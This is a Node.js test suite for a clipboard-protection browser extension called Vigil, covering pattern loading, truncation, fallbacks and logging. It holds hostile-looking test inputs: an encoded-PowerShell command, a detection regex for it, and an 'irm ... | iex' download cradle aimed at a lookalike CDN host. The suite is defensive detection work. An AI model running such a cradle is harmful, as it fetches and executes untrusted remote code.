'use strict';
// Behavior tests for Vigil clipboard protection (detection-robustness batch).
// Each test drives the real extension sources through the vm harness.
const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const { loadClipboard, loadBackground, sendBackgroundMessage, loadShippedPatterns } = require('./helpers');

test('copy event triggers an immediate clipboard check', async () => {
  const { state } = loadClipboard({
    onSendMessage: (m) => (m.type === 'isTextInSafeList' ? false : { isMalicious: false }),
  });
  state.clipboardText = 'hello world';

  assert.equal(
    state.listeners.copy?.length, 1,
    'expected clipboard.js to register exactly one copy listener',
  );
  for (const fn of state.listeners.copy) await fn();

  assert.ok(
    state.sentMessages.some((m) => m.type === 'isTextInSafeList' && m.text === 'hello world'),
    'expected copy event to trigger a safelist check for current clipboard text',
  );
});

test('oversized clipboard text is truncated before validation', async () => {
  const { state } = loadClipboard({
    onSendMessage: (m) => (m.type === 'isTextInSafeList' ? false : { isMalicious: false }),
  });
  // Malicious marker up front, then padding far beyond any sane command length.
  state.clipboardText = `powershell -EncodedCommand ABCDEF${'x'.repeat(20000)}`;
  for (const fn of state.listeners.copy) await fn();

  const validated = state.sentMessages.find((m) => m.type === 'validateCopiedText');
  assert.ok(validated, 'expected the text to reach validation');
  assert.ok(
    validated.text.length <= 16000,
    `expected truncated validation text, got ${validated.text.length} chars`,
  );
  assert.ok(
    validated.text.includes('powershell -EncodedCommand'),
    'expected truncation to keep the head of the text where the command lives',
  );
});

test('background caps oversized validation input', async () => {
  const { state } = loadBackground({
    store: {
      vigilDynamicPatterns: [{ source: 'powershell.+EncodedCommand', flags: 'i' }],
      vigilPatternsLastUpdated: Date.now(),
      scannedEntries: 0,
      maliciousFound: 0,
    },
  });
  const bigText = `powershell -EncodedCommand ABCDEF${'y'.repeat(100000)}`;
  const response = await sendBackgroundMessage(state, { type: 'validateCopiedText', text: bigText });
  assert.equal(response.isMalicious, true, 'expected head-based detection on oversized input');
});

test('one bad pattern does not kill all detection', async () => {
  const { state } = loadBackground({
    store: {
      vigilDynamicPatterns: [
        { source: '([', flags: 'i' }, // invalid regex: must be skipped, not fatal
        { source: 'powershell.+EncodedCommand', flags: 'i' },
      ],
      vigilPatternsLastUpdated: Date.now(),
      scannedEntries: 0,
      maliciousFound: 0,
    },
  });
  const response = await sendBackgroundMessage(state, {
    type: 'validateCopiedText',
    text: 'powershell -EncodedCommand ABCDEF',
  });
  assert.equal(response.isMalicious, true, 'expected surviving good pattern to still flag');
});

test('empty remote pattern fetch never wipes stored patterns', async () => {
  const goodPatterns = [{ source: 'powershell.+EncodedCommand', flags: 'i' }];
  const { state } = loadBackground({
    store: {
      vigilDynamicPatterns: goodPatterns,
      vigilPatternsLastUpdated: 1234,
      scannedEntries: 0,
      maliciousFound: 0,
    },
    fetchImpl: async () => ({ ok: true, json: async () => [] }),
  });
  await state.handlers.onAlarm({ name: 'updateVigilPatternsAlarm' });
  await new Promise((resolve) => setTimeout(resolve, 10));

  assert.deepEqual(
    state.store.vigilDynamicPatterns, goodPatterns,
    'expected stored patterns to survive an empty remote fetch',
  );
});

test('empty remote fetch on cold start falls back to local patterns', async () => {
  const { state } = loadBackground({
    store: {},
    fetchImpl: async (url) => {
      if (String(url).startsWith('https://')) return { ok: true, json: async () => [] };
      return { ok: true, json: async () => [{ source: 'LOCALMARKER', flags: 'i' }] };
    },
  });
  const response = await sendBackgroundMessage(state, {
    type: 'validateCopiedText',
    text: 'text with LOCALMARKER inside',
  });
  assert.equal(response.isMalicious, true, 'expected local fallback patterns after empty remote');
});

test('one malformed stored entry keeps the good ones', async () => {
  const { state } = loadBackground({
    store: {
      vigilDynamicPatterns: [{ source: 123 }, { source: 'STOREIGOOD', flags: 'i' }],
      vigilPatternsLastUpdated: Date.now(),
      scannedEntries: 0,
      maliciousFound: 0,
    },
    fetchImpl: async () => { throw new Error('offline'); },
  });
  const response = await sendBackgroundMessage(state, {
    type: 'validateCopiedText',
    text: 'has STOREIGOOD inside',
  });
  assert.equal(response.isMalicious, true, 'expected good stored pattern to survive a bad sibling');
});

test('alert UI receives full bytes while validation uses the head', async () => {
  const { state } = loadBackground({
    store: {
      vigilDynamicPatterns: [{ source: 'powershell.+EncodedCommand', flags: 'i' }],
      vigilPatternsLastUpdated: Date.now(),
      scannedEntries: 0,
      maliciousFound: 0,
    },
  });
  const bigText = `powershell -EncodedCommand ABC${'z'.repeat(20000)}`;
  const response = await sendBackgroundMessage(state, { type: 'validateCopiedText', text: bigText });
  assert.equal(response.isMalicious, true, 'expected head-based detection');
  assert.equal(state.tabsSent.length, 1, 'expected one UI alert');
  assert.equal(
    state.tabsSent[0].msg.text, bigText,
    'expected UI/quarantine path to carry full bytes, not the truncated head',
  );
});

test('non-tab senders still validate and count', async () => {
  const { state } = loadBackground({
    store: {
      vigilDynamicPatterns: [{ source: 'powershell.+EncodedCommand', flags: 'i' }],
      vigilPatternsLastUpdated: Date.now(),
      scannedEntries: 0,
      maliciousFound: 0,
    },
  });
  const response = await sendBackgroundMessage(
    state,
    { type: 'validateCopiedText', text: 'powershell -EncodedCommand ABC' },
    {}, // no tab (e.g. popup/options sender)
  );
  assert.equal(response.isMalicious, true, 'expected validation without a tab sender');
  assert.equal(state.store.scannedEntries, 1, 'expected scan counted');
  assert.equal(state.store.maliciousFound, 1, 'expected detection counted');
  assert.equal(state.tabsSent.length, 0, 'expected no UI message without a tab');
});

test('concurrent duplicate oversized checks validate once', async () => {
  const { state } = loadClipboard({
    onSendMessage: async (m) => {
      if (m.type === 'isTextInSafeList') return false;
      await new Promise((resolve) => setTimeout(resolve, 20));
      return { isMalicious: false };
    },
  });
  state.clipboardText = 'D'.repeat(20000);
  const [onCopy] = state.listeners.copy;
  await Promise.all([onCopy(), onCopy()]);
  const validates = state.sentMessages.filter((m) => m.type === 'validateCopiedText');
  assert.equal(validates.length, 1, `expected one validation, got ${validates.length}`);
});

test('skipped patterns log a warning', async () => {
  const warns = [];
  const { state } = loadBackground({
    console: { log: () => {}, warn: (...args) => warns.push(args.join(' ')), error: () => {} },
    store: {
      vigilDynamicPatterns: [
        { source: 'x'.repeat(2000) }, // overlong: skipped
        { source: 'harmless', flags: 'BAD!' }, // bad flags: skipped
        { source: 'NOMATCHMARKER' },
      ],
      vigilPatternsLastUpdated: Date.now(),
      scannedEntries: 0,
      maliciousFound: 0,
    },
  });
  const response = await sendBackgroundMessage(state, {
    type: 'validateCopiedText',
    text: 'nothing to see here',
  });
  assert.equal(response.isMalicious, false);
  assert.ok(warns.length >= 2, `expected warnings for skipped patterns, got ${warns.length}`);
});

test('suppressed re-poll leaves no stale in-flight flag', async () => {
  const vm = require('node:vm');
  const { context, state } = loadClipboard({
    onSendMessage: (m) => (m.type === 'isTextInSafeList' ? false : { isMalicious: false }),
  });
  state.clipboardText = 'hello again';
  const [onCopy] = state.listeners.copy;
  await onCopy(); // validates; lastClipboardText = text
  // Simulate already-alerted state, then a suppressed duplicate poll.
  await vm.runInContext(`(async () => {
    lastAlertedText = lastClipboardText;
    await processAndRelayClipboardText(lastClipboardText, 'polled');
  })()`, context);
  assert.equal(
    vm.runInContext('validationInProgressForText', context), null,
    'expected in-flight flag released after suppressed re-poll',
  );
});

test('shipped patterns flag the irm download cradle', () => {
  const { regexes } = loadShippedPatterns();
  const evil = 'irm cdn.jsdelasdasdasdivr.net/gh/hangnail-lab/scorecard/core | iex';
  assert.ok(
    regexes.some((re) => re.test(evil)),
    'expected at least one shipped pattern to flag the irm|iex download cradle',
  );
});

test('shipped patterns compile cleanly and spare benign text', () => {
  const { entries, regexes, skipped } = loadShippedPatterns();
  assert.equal(skipped.length, 0, `expected zero skipped patterns, got ${skipped.length}`);
  assert.equal(regexes.length, entries.length);
  for (const benign of ['hello world', 'npm install express']) {
    assert.ok(
      !regexes.some((re) => re.test(benign)),
      `expected benign text to stay clean: ${benign}`,
    );
  }
});

test('remote pattern fetch is cache-busted', async () => {
  const urls = [];
  const { state } = loadBackground({
    store: {},
    fetchImpl: async (url) => {
      urls.push(String(url));
      return { ok: true, json: async () => [{ source: 'x', flags: 'i' }] };
    },
  });
  await state.handlers.onInstalled();
  assert.ok(
    urls.some((u) => u.includes('pattern.json?t=')),
    `expected cache-busted pattern URL, got ${JSON.stringify(urls)}`,
  );
});

test('pattern state is observable in logs', async () => {
  const logs = [];
  const stubConsole = { log: (...a) => logs.push(a.join(' ')), warn: (...a) => logs.push(a.join(' ')), error: () => {} };
  const { state } = loadBackground({
    store: {},
    console: stubConsole,
    fetchImpl: async () => ({ ok: true, json: async () => [{ source: 'x', flags: 'i' }, { source: 'y', flags: '' }] }),
  });
  await state.handlers.onInstalled();
  assert.ok(
    logs.some((l) => l.includes('stored') && l.includes('2')),
    `expected stored-pattern count in logs, got ${JSON.stringify(logs)}`,
  );

  const logs2 = [];
  const stubConsole2 = { log: (...a) => logs2.push(a.join(' ')), warn: (...a) => logs2.push(a.join(' ')), error: () => {} };
  const state2 = loadBackground({
    store: { vigilDynamicPatterns: [{ source: 'x', flags: 'i' }], vigilPatternsLastUpdated: 1726000000000 },
    console: stubConsole2,
  }).state;
  await sendBackgroundMessage(state2, { type: 'validateCopiedText', text: 'hello' });
  assert.ok(
    logs2.some((l) => l.includes('stored patterns') && l.includes('1')),
    `expected stored-pattern reuse in logs, got ${JSON.stringify(logs2)}`,
  );
});

test('clipboard read failure warns once, not silently or spammy', async () => {
  const warns = [];
  const stubConsole = { log: () => {}, warn: (...a) => warns.push(a.join(' ')), error: () => {} };
  const { context } = loadClipboard({ console: stubConsole });
  vm.runInContext('navigator.clipboard.readText = async () => { throw new Error("denied"); };', context);
  await vm.runInContext('checkClipboard()', context);
  await vm.runInContext('checkClipboard()', context);
  assert.equal(warns.length, 1, `expected exactly one read-failure warn, got ${JSON.stringify(warns)}`);
});
